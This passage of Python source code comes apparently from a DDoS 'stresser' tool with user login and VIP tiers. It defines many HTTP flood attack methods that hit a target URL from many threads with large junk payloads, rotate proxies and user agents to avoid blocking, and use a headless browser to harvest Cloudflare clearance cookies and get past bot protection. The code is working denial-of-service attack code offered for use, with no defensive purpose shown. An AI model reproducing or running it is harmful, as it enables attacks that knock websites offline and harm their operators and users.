            logo += "\t\t╚══════════════════════╩══════════════════"+'\033[0m'+"════════╝ \n"
            print(logo)
        def love():
            clear()
            print(color.red + "\t\t⠀⣠⣤⣶⣶⣦⣄⡀⠀⢀⣤⣴⣶⣶⣤⣀⠀")
            print("\t\t⣼⣿⣿⣿⣿⣿⣿⣷⣤⣾⣿⣿⣿⣿⣿⣿⣧")
            print("\t\t⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
            print("\t\t⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏")
            print("\t\t⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀")
            print("\t\t⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀")
            print("\t\t⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀")
            print("\t\t⠀⠀⠀⠀⠀⠀⠀⠙⠻⠁⠀⠀⠀⠀⠀⠀⠀")
    class DDOS:
        class method:
            def SKY():
                def starting(url, threads, t):
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = {
                        "User-Agent": random.choice(user_agents)
                    }
                    def requestor(url):
                        cf.get(url, headers=headers, timeout=15)
                        requests.get(url, headers=headers, timeout=15)
                        cf.get(url, timeout=15)
                        requests.get(url, timeout=15)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=SKYAttack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def SKYAttack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'SKY'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def PXSKY():
                def starting(url, threads, t, proxy):
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        'http': 'http://'+str(random.choice(list(proxzy))),
                        'https': 'http://'+str(random.choice(list(proxzy)))
                    }
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = {
                        "User-Agent": random.choice(user_agents)
                    }
                    def requestor(url):
                        cf.get(url, headers=headers, timeout=15, proxies=proksi)
                        requests.get(url, headers=headers, timeout=15, proxies=proksi)
                        cf.get(url, timeout=15, proxies=proksi)
                        requests.get(url, timeout=15, proxies=proksi)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=PXSKYAttack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def PXSKYAttack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXSKY'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            def CFB():
                def starting(url, threads, t):
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = {
                        "User-Agent": random.choice(user_agents)
                    }
                    def requestor(url):
                        cf.get(url, headers=headers, timeout=15)
                        cf.get(url, timeout=15)
                        for _ in range(200):
                            cf.get(url, timeout=15)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=CFBAttack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def CFBAttack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'CFB'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def PXSTAR():
                def starting(url, threads, t, proxy):
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        'http': 'http://'+str(random.choice(list(proxzy))),
                        'https': 'http://'+str(random.choice(list(proxzy)))
                    }
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = {
                        "User-Agent": random.choice(user_agents)
                    }
                    data = {
                        "X": "X"*2048,
                        "Y": "Y"*2048,
                        "Z": "Z"*2048
                    }
                    def requestor(url):
                        requests.post(url, headers=headers, timeout=15, proxies=proksi, data=data)
                        requests.post(url, timeout=15, proxies=proksi, data=data)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=PXSTARAttack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def PXSTARAttack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXSTAR'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            def ION():
                def starting(url, threads, t):
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = {
                        "User-Agent": random.choice(user_agents)
                    }
                    data = {
                        "X": "X"*1024,
                        "Y": "Y"*1024,
                        "Z": "Z"*1024
                    }
                    def requestor(url):
                        cf.post(url, headers=headers, timeout=15, data=data)
                        httpx.post(url, headers=headers, timeout=15, data=data)
                        requests.post(url, headers=headers, timeout=15, data=data)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=IONAttack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def IONAttack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'ION'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def PXCFB():
                def starting(url, threads, t, proxy):
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        'http': 'http://'+str(random.choice(list(proxzy))),
                        'https': 'http://'+str(random.choice(list(proxzy)))
                    }
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = {
                        "User-Agent": random.choice(user_agents)
                    }
                    def requestor(url):
                        cf.get(url, headers=headers, timeout=15, proxies=proksi)
                        cf.get(url, timeout=15, proxies=proksi)
                        for _ in range(200):
                            cf.get(url, timeout=15, proxies=proksi)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=PXCFBAttack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def PXCFBAttack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXCFB'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            def CFPRO():
                def starting(url, threads, t):
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = {
                        "User-Agent": random.choice(user_agents)
                    }
                    data = {
                        "X": "X".encode('ascii')*4096,
                        "Y": "X".encode('ascii')*4096,
                        "Z": "Z".encode('ascii')*4096
                    }
                    def requestor(url):
                        cf.post(url, headers=headers, timeout=15, data=data)
                        cf.post(url, timeout=15, data=data, headers=headers)
                        for _ in range(200):
                            cf.post(url, timeout=15, data=data, headers=headers)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=CFPROAttack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def CFPROAttack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'CFPRO'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def PXCFPRO():
                def starting(url, threads, t, proxy):
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        'http': 'http://'+str(random.choice(list(proxzy))),
                        'https': 'http://'+str(random.choice(list(proxzy)))
                    }
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = {
                        "User-Agent": random.choice(user_agents)
                    }
                    data = {
                        "X": "X".encode('ascii')*4096,
                        "Y": "X".encode('ascii')*4096,
                        "Z": "Z".encode('ascii')*4096
                    }
                    def requestor(url):
                        cf.post(url, headers=headers, timeout=15, data=data, proxies=proksi)
                        cf.post(url, timeout=15, headers=headers, data=data, proxies=proksi)
                        for _ in range(200):
                            cf.post(url, timeout=15, headers=headers, data=data, proxies=proksi)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=PXCFPROAttack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def PXCFPROAttack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXCFPRO'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            def STRESSERV1():
                def starting(url, threads, t):
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = headdata.mix(url)
                    data = headdata.datamix()
                    def requestor(url):
                        cf.get(url, headers=headers, timeout=15, data=data)
                        requests.get(url, headers=headers, data=data, timeout=15)
                        httpx.get(url, headers=headers, data=data, timeout=15)
                        for _ in range(200):
                            cf.get(url, timeout=15, data=data, headers=headers)
                            requests.get(url, headers=headers, data=data, timeout=15)
                            httpx.get(url, headers=headers, data=data, timeout=15)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=S1Attack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def S1Attack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'StresserV1'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def STRESSERV2():
                def starting(url, threads, t):
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = headdata.mix(url)
                    data = headdata.datamix()
                    def requestor(url):
                        cf.get(url, headers=headers, timeout=15, data=data, verify=False)
                        requests.get(url, headers=headers, data=data, timeout=15, verify=False)
                        httpx.get(url, headers=headers, data=data, timeout=15, verify=False)
                        for _ in range(200):
                            cf.get(url, timeout=15, data=data, headers=headers, verify=False)
                            requests.get(url, headers=headers, data=data, timeout=15, verify=False)
                            httpx.get(url, headers=headers, data=data, timeout=15, verify=False)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=S2Attack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def S2Attack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'StresserV2'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def ICBM():
                def starting(url, threads, t):
                    cloud = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    def requestor(url):
                        headers={
                            "User-Agent": random.choice(user_agents)
                        }
                        data = {
                            "data": "ZABCDEF57".encode('utf-8')*8192
                        }
                        cloud.post(url, timeout=15, data=data, headers=headers)
                        cloud.post(url, timeout=15, data=data, headers=headers)
                        requests.post(url, timeout=15, data=data, headers=headers)
                        requests.post(url, timeout=15, data=data, headers=headers)
                    spreader = []
                    for _ in range(int(threads)):
                        thrd = threading.Thread(target=icbm, args=(url, duration, requestor))
                        thrd.start()
                        spreader.append(thrd)
                    for threads in spreader:
                        threads.join()
                def icbm(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'ICBM'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def PXICBM():
                def starting(url, threads, t, proxy):
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        'http': 'http://'+str(random.choice(list(proxzy))),
                        'https': 'http://'+str(random.choice(list(proxzy)))
                    }
                    cloud = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    def requestor(url):
                        headers={
                            "User-Agent": random.choice(user_agents)
                        }
                        data = {
                            "data": "ZABCDEF57".encode('utf-8')*8192
                        }
                        cloud.post(url, timeout=15, data=data, headers=headers, proxies=proksi)
                        cloud.post(url, timeout=15, data=data, headers=headers, proxies=proksi)
                        requests.post(url, timeout=15, data=data, headers=headers, proxies=proksi)
                        requests.post(url, timeout=15, data=data, headers=headers, proxies=proksi)
                    spreader = []
                    for _ in range(int(threads)):
                        thrd = threading.Thread(target=icbm, args=(url, duration, requestor))
                        thrd.start()
                        spreader.append(thrd)
                    for threads in spreader:
                        threads.join()
                def icbm(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXICBM'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            def ANYA():
                def starting(url, threads, t):
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = {
                        "User-Agent": random.choice(user_agents),
                        "Range": "bytes=1-6500"
                    }
                    data=headdata.datamix()
                    def requestor(url):
                        cf.get(url, headers=headers, timeout=15, data=data)
                        requests.get(url, headers=headers, timeout=15, data=data)
                        cf.post(url, timeout=15, data=data)
                        requests.post(url, timeout=15, data=data)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=ANYAttack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def ANYAttack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'ANYA'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def PXANYA():
                def starting(url, threads, t, proxy):
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        'http': 'http://'+str(random.choice(list(proxzy))),
                        'https': 'http://'+str(random.choice(list(proxzy)))
                    }
                    cf = cloudscraper.create_scraper()
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    headers = {
                        "User-Agent": random.choice(user_agents),
                        "Range": "bytes=1-6500"
                    }
                    data=headdata.datamix()
                    def requestor(url):
                        cf.get(url, headers=headers, timeout=15, data=data, proxies=proksi)
                        requests.get(url, headers=headers, timeout=15, data=data, proxies=proksi)
                        cf.get(url, timeout=15, data=data, proxies=proksi)
                        requests.get(url, timeout=15, data=data, proxies=proksi)
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=PXANYAttack, args=(url, duration, requestor))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def PXANYAttack(url, duration, requestor):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            requestor(url)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXANYA'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            class jar:
                def get_cookie(url):
                    global useragent, cookieJAR, cookie
                    options = webdriver.ChromeOptions()
                    arguments = [
                    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
                    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
                    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
                    ]
                    for argument in arguments:
                        options.add_argument(argument)
                    driver = webdriver.Chrome(options=options)
                    driver.implicitly_wait(3)
                    driver.get(url)
                    for _ in range(60):
                        cookies = driver.get_cookies()
                        tryy = 0
                        for i in cookies:
                            if i['name'] == 'cf_clearance':
                                cookieJAR = driver.get_cookies()[tryy]
                                useragent = driver.execute_script("return navigator.userAgent")
                                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                                driver.quit()
                                return True
                            else:
                                tryy += 1
                                pass
                        time.sleep(1)
                    driver.quit()
                    return False
                def ANYAV2():
                    def starting(url, threads, t):
                        duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                        session = requests.Session()
                        scraper = cloudscraper.create_scraper(sess=session)
                        jar = RequestsCookieJar()
                        jar.set(cookieJAR['name'], cookieJAR['value'])
                        scraper.cookies = jar
                        bot = []
                        for _ in range(int(threads)):
                            thrd = threading.Thread(target=ANYAH, args=(url, duration, scraper, ))
                            thrd.start()
                            bot.append(thrd)
                        for threads in bot:
                            threads.join()
                    def ANYAH(url, duration, scraper):
                        headers = {
                            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '15',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'same-origin',
                            'Sec-Fetch-User': '?1',
                            'TE': 'trailers'
                        }
                        while (duration - datetime.datetime.now()).total_seconds() > 0:
                            try:
                                scraper.get(url=url, headers=headers, allow_redirects=False, timeout=15)
                                scraper.get(url=url, headers=headers, allow_redirects=False, timeout=15)
                                for _ in range(500):
                                    scraper.get(url=url, headers=headers, allow_redirects=False, verify=False, timeout=15)
                                    scraper.get(url=url, headers=headers, allow_redirects=False, verify=False, timeout=15)
                            except:
                                pass
                    if __name__ == '__main__':
                        url, threads, t = prompt.layer7_target()
                        cookie = input('cookie target : ')
                        try:
                            timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'ANYAV2'))
                            timer.start()
                            starting(url, threads, t, cookie)
                            timer.join()
                        except:
                            print('an error occured')
                            return
                def PXANYAV2():
                    def starting(url, threads, t, proxy, cookie):
                        ip_list = open('resources/logs/{}'.format(proxy), 'r')
                        ips = ip_list.readlines()
                        ip_list.close()
                        proxzy = ips
                        proksi = {
                            'http': 'http://'+str(random.choice(list(proxzy))),
                            'https': 'http://'+str(random.choice(list(proxzy)))
                        }
                        duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                        session = requests.Session()
                        scraper = cloudscraper.create_scraper(sess=session)
                        scraper.cookies = cookie
                        bot = []
                        for _ in range(int(threads)):
                            thrd = threading.Thread(target=ANYAH, args=(url, duration, scraper, proksi))
                            thrd.start()
                            bot.append(thrd)
                        for threads in bot:
                            threads.join()
                    def ANYAH(url, duration, scraper, proksi):
                        headers = {
                            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '15',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'same-origin',
                            'Sec-Fetch-User': '?1',
                            'TE': 'trailers'
                        }
                        while (duration - datetime.datetime.now()).total_seconds() > 0:
                            try:
                                scraper.get(url=url, headers=headers, timeout=15, proxies=proksi)
                                scraper.get(url=url, headers=headers, timeout=15, proxies=proksi)
                                for _ in range(500):
                                    scraper.get(url=url, headers=headers, verify=False, timeout=15, proxies=proksi)
                                    scraper.get(url=url, headers=headers, verify=False, timeout=15, proxies=proksi)
                            except:
                                pass
                    if __name__ == '__main__':
                        url, threads, t, proxy = proxied.layer7_target()
                        cookie = input('cookie target : ')
                        try:
                            timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXANYAV2'))
                            timer.start()
                            starting(url, threads, t, proxy, cookie)
                            timer.join()
                        except:
                            print('an error occured')
                            return
            def CFUAM():
                def starting(url, threads, t, proxy):
                    global config
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        'http': 'http://'+str(random.choice(list(proxzy))),
                        'https': 'http://'+str(random.choice(list(proxzy)))
                    }
                    bot = []
                    for hash_digest in range(int(threads)):
                        tr = threading.Thread(target=Target.Bypass, args=[url, proxy, hash_digest]).start()
                        bot.append(tr)
                    for threads in bot:
                        threads.join()
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'CFUAM'))
                    timer.start()
                    url = target(url)
                    starting(url, threads, t, proxy)
                    timer.join()
            def BUMB():
                def starting(url, threads, t):
                    data = {
                        'data': "ZABCDE57".encode('utf-8')*16384
                    }
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    sess = requests.Session()
                    scraper=cloudscraper.create_scraper(sess=sess)
                    bot = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=boom, args=(url, duration, scraper, data))
                        thread.start()
                        bot.append(thread)
                    for threads in bot:
                        threads.join()
                def boom(url, duration, scraper, data):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        headers = {
                            "User-Agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
                            "Host": urlparse(url).path,
                            "Range": "bytes=0-8192",
                            "Content-Length": "8192",
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '15',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'same-origin',
                            'Sec-Fetch-User': '?1',
                            'TE': 'trailers'
                        }
                        try:
                            scraper.post(url, timeout=15, data=data, headers=headers)
                            scraper.post(url, timeout=15, data=data, headers=headers)
                            for _ in range(50):
                                scraper.post(url, timeout=15, data=data, headers=headers)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'BUMB'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def PXBUMB():
                def starting(url, threads, t, proxy):
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        'http': 'http://'+str(random.choice(list(proxzy))),
                        'https': 'http://'+str(random.choice(list(proxzy)))
                    }
                    data = {
                        'data': "ZABCDE57".encode('utf-8')*16384
                    }
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    sess = requests.Session()
                    scraper=cloudscraper.create_scraper(sess=sess)
                    bot = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=boom, args=(url, duration, scraper, data, proksi))
                        thread.start()
                        bot.append(thread)
                    for threads in bot:
                        threads.join()
                def boom(url, duration, scraper, data, proksi):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        headers = {
                            "User-Agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
                            "Host": urlparse(url).path,
                            "Range": "bytes=0-8192",
                            "Content-Length": "8192",
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '15',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'same-origin',
                            'Sec-Fetch-User': '?1',
                            'TE': 'trailers'
                        }
                        try:
                            scraper.post(url, timeout=15, data=data, headers=headers, proxies=proksi)
                            scraper.post(url, timeout=15, data=data, headers=headers, proxies=proksi)
                            for _ in range(50):
                                scraper.post(url, timeout=15, data=data, headers=headers, proxies=proksi)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXBUMB'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            class ghost:
                def get():
                    def starting(url, threads, t):
                        duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                        session = requests.Session()
                        scraper = cloudscraper.create_scraper(sess=session)
                        bot = []
                        for _ in range(int(threads)):
                            thread = threading.Thread(target=get, args=(url, duration, scraper))
                            thread.start()
                            bot.append(thread)
                        for threads in bot:
                            threads.join()
                    def get(url, duration, scraper):
                        while (duration - datetime.datetime.now()).total_seconds() > 0:
                            try:
                                scraper.get(url, timeout=15)
                                requests.get(url, timeout=15)
                            except:
                                pass
                    if __name__ == '__main__':
                        url, threads, t = prompt.layer7_target()
                        timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'GET'))
                        timer.start()
                        starting(url, threads, t)
                        timer.join()
                def post():
                    def starting(url, threads, t):
                        duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                        session = requests.Session()
                        scraper = cloudscraper.create_scraper(sess=session)
                        bot = []
                        for _ in range(int(threads)):
